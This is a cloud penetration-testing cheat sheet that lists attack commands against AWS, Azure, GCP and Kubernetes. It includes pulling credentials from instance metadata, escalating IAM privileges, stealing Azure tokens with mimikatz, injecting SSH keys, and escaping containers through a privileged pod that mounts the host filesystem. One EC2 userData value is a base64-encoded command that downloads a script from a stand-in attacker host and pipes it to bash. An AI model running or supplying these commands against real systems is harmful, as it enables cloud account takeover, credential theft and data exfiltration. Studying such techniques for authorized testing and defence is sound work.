# Cloud Security Attacks

Cloud environments (AWS, Azure, GCP) present unique attack surfaces and require specialized techniques for authorized penetration testing and red team engagements.

---

## Cloud Attack Framework

```
    CLOUD ATTACK PHASES

    [Initial Access]
           |
    +------+------+
    |      |      |
    v      v      v
    [Credentials] [Misconfig] [App Vuln]
           |
           v
    [Cloud Enumeration]
           |
           v
    [Privilege Escalation]
           |
           v
    [Lateral Movement]
           |
           v
    [Data Access/Exfiltration]
```

---

## Initial Access Vectors

### Common Entry Points

| Vector | Description | Target |
|--------|-------------|--------|
| Credential Exposure | Leaked keys, commits | IAM credentials |
| SSRF | Access metadata service | Instance credentials |
| Misconfigured Storage | Public S3/Blob | Data access |
| Phishing | OAuth consent | User tokens |
| Vulnerable Applications | Web app exploits | Compute instances |

### Credential Discovery

```bash
# Search GitHub
trufflehog git https://github.com/org/repo
gitleaks detect --source ./repo

# Search public sources
grep -r "AKIA" /path/to/code  # AWS access key
grep -r "-----BEGIN RSA PRIVATE KEY-----" /path

# Check exposed services
curl http://169.254.169.254/latest/meta-data/  # AWS
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/  # GCP
curl -H "Metadata: true" http://169.254.169.254/metadata/instance  # Azure
```

---

## AWS Attacks

### AWS Enumeration

```bash
# Configure credentials
aws configure
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...

# Identity enumeration
aws sts get-caller-identity
aws iam get-user

# Policy enumeration
aws iam list-attached-user-policies --user-name USER
aws iam list-user-policies --user-name USER
aws iam get-policy-version --policy-arn ARN --version-id v1

# Service enumeration
aws ec2 describe-instances
aws s3 ls
aws lambda list-functions
aws rds describe-db-instances
```

### AWS Privilege Escalation

| Technique | Required Permission | Result |
|-----------|---------------------|--------|
| IAM Policy Attachment | iam:AttachUserPolicy | Admin access |
| Create Access Key | iam:CreateAccessKey | New credentials |
| AssumeRole | sts:AssumeRole | Role access |
| Lambda Function | lambda:UpdateFunctionCode | Code execution |
| EC2 UserData | ec2:ModifyInstanceAttribute | Instance access |
| SSM Command | ssm:SendCommand | Remote execution |

```bash
# Attach admin policy
aws iam attach-user-policy --user-name USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access key for another user
aws iam create-access-key --user-name TARGET_USER

# Assume role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/ROLE --role-session-name session

# Update Lambda function
aws lambda update-function-code --function-name FUNC --zip-file fileb://malicious.zip

# EC2 UserData modification
aws ec2 modify-instance-attribute --instance-id i-xxx --attribute userData --value "IyEvYmluL2Jhc2gKY3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIHwgYmFzaA=="

# SSM command execution
aws ssm send-command --instance-ids i-xxx --document-name AWS-RunShellScript --parameters 'commands=["whoami"]'
```

### S3 Attacks

```bash
# List buckets
aws s3 ls
aws s3 ls s3://bucket-name

# Check bucket ACL
aws s3api get-bucket-acl --bucket bucket-name
aws s3api get-bucket-policy --bucket bucket-name

# Download data
aws s3 sync s3://bucket-name ./local-folder

# Upload (if writable)
aws s3 cp malicious.html s3://bucket-name/

# Anonymous access check
aws s3 ls s3://bucket-name --no-sign-request
```

### AWS Tools

```bash
# Pacu (AWS exploitation framework)
python3 pacu.py
run iam__enum_permissions
run iam__privesc_scan
run ec2__enum

# ScoutSuite (audit)
scout aws

# Prowler (security assessment)
./prowler -M html

# CloudMapper (visualization)
python cloudmapper.py collect --account ACCOUNT
python cloudmapper.py webserver
```

---

## Azure Attacks

### Azure Enumeration

```bash
# Azure CLI login
az login
az account show

# User enumeration
az ad user list
az ad user show --id USER_ID

# Group enumeration
az ad group list
az ad group member list --group GROUP_ID

# Role enumeration
az role assignment list
az role definition list

# Resource enumeration
az resource list
az vm list
az storage account list
az webapp list
```

### Azure AD Attacks

```bash
# ROADtools enumeration
roadrecon auth -u user@domain.com -p password
roadrecon gather
roadrecon gui

# AADInternals
Import-Module AADInternals
Get-AADIntAccessTokenForMSGraph -Credentials $cred
Get-AADIntUsers

# PRT (Primary Refresh Token) theft
mimikatz # token::elevate
mimikatz # sekurlsa::cloudap
```

### Azure Privilege Escalation

| Technique | Permission | Result |
|-----------|------------|--------|
| Custom Role Assignment | Microsoft.Authorization/roleAssignments/write | Elevated access |
| Reset Password | Microsoft.Directory/users/password/update | Account takeover |
| Add App Secret | Microsoft.Directory/applications/credentials/update | App access |
| VM Command | Microsoft.Compute/virtualMachines/runCommand | VM execution |

```bash
# Assign role
az role assignment create --role Owner --assignee USER_ID --scope /subscriptions/SUB_ID

# Reset user password
az ad user update --id USER_ID --password NewPassword123!

# Add app credential
az ad app credential reset --id APP_ID --append

# VM run command
az vm run-command invoke --resource-group RG --name VM --command-id RunShellScript --scripts "whoami"
```

### Azure Blob Storage

```bash
# List storage accounts
az storage account list

# List containers
az storage container list --account-name ACCOUNT

# List blobs
az storage blob list --container-name CONTAINER --account-name ACCOUNT

# Download blob
az storage blob download --container-name CONTAINER --name FILE --file local_file --account-name ACCOUNT

# Check anonymous access
curl "https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list"
```

---

## GCP Attacks

### GCP Enumeration

```bash
# Authenticate
gcloud auth login
gcloud auth activate-service-account --key-file=key.json

# Project enumeration
gcloud projects list
gcloud config set project PROJECT_ID

# IAM enumeration
gcloud iam roles list
gcloud projects get-iam-policy PROJECT_ID

# Service accounts
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account SA_EMAIL

# Compute enumeration
gcloud compute instances list
gcloud compute firewall-rules list
gcloud compute networks list
```

### GCP Privilege Escalation

| Technique | Permission | Result |
|-----------|------------|--------|
| Service Account Key | iam.serviceAccountKeys.create | SA access |
| IAM Policy Binding | resourcemanager.projects.setIamPolicy | Elevated access |
| Impersonation | iam.serviceAccounts.getAccessToken | Token for SA |
| Compute SSH | compute.instances.setMetadata | Instance access |

```bash
# Create service account key
gcloud iam service-accounts keys create key.json --iam-account SA_EMAIL

# Add IAM binding
gcloud projects add-iam-policy-binding PROJECT_ID --member=user:USER@EMAIL --role=roles/owner

# Impersonate service account
gcloud auth print-access-token --impersonate-service-account=SA_EMAIL

# SSH via metadata
gcloud compute instances add-metadata INSTANCE --metadata ssh-keys="attacker:$(cat ~/.ssh/id_rsa.pub)"
gcloud compute ssh INSTANCE
```

### GCS Bucket Attacks

```bash
# List buckets
gsutil ls

# List bucket contents
gsutil ls gs://bucket-name

# Download
gsutil cp gs://bucket-name/file ./local

# Check permissions
gsutil iam get gs://bucket-name

# Test anonymous access
curl "https://storage.googleapis.com/bucket-name"
```

---

## Container/Kubernetes Attacks

### Kubernetes Enumeration

```bash
# Get contexts
kubectl config get-contexts

# Namespace enumeration
kubectl get namespaces
kubectl get pods --all-namespaces

# Secret enumeration
kubectl get secrets --all-namespaces
kubectl get secret SECRET_NAME -o jsonpath='{.data}'

# Service account tokens
kubectl get serviceaccounts
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Kubernetes Privilege Escalation

```bash
# Create privileged pod
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
spec:
  containers:
  - name: attacker
    image: alpine
    command: ["/bin/sh"]
    args: ["-c", "sleep 100000"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
EOF

# Access host filesystem
kubectl exec -it attacker-pod -- chroot /host /bin/bash
```

---

## Cloud Metadata Services

### Metadata Endpoints

| Cloud | Endpoint |
|-------|----------|
| AWS | http://169.254.169.254/latest/meta-data/ |
| GCP | http://169.254.169.254/computeMetadata/v1/ |
| Azure | http://169.254.169.254/metadata/instance |

### SSRF to Metadata

```bash
# AWS credential extraction
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

# GCP service account token
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure managed identity
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## References

- Rhino Security Labs Cloud Research
- SpecterOps Azure AD Security
- GCP Privilege Escalation Research
- HackTricks Cloud

---

## Document Control

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2024-01-15 | Security Architecture | Initial release |
